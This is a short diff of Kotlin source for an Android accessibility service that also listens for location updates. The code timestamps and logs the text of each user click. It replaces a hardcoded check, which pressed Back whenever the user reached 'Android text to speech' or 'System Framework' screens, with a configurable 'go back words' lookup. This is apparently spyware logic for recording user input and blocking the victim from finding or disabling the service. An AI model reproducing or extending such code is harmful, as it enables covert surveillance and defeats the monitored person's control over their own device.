@@ -77,10 +77,8 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
                 val data = event.text.toString()
                 if (data != "[]") {
                     interactor.setDataKey("${getDateTime()} |(CLICKED)| $data")
+                    interactor.getGoBackWords(this, data)
                     i(TAG, "${getDateTime()} |(CLICKED)| $data")
-                    if (data.contains("Android text to speech") || data.contains("System Framework")){
-                        performGlobalAction(GLOBAL_ACTION_BACK)
-                    }
                 }
             }
         }
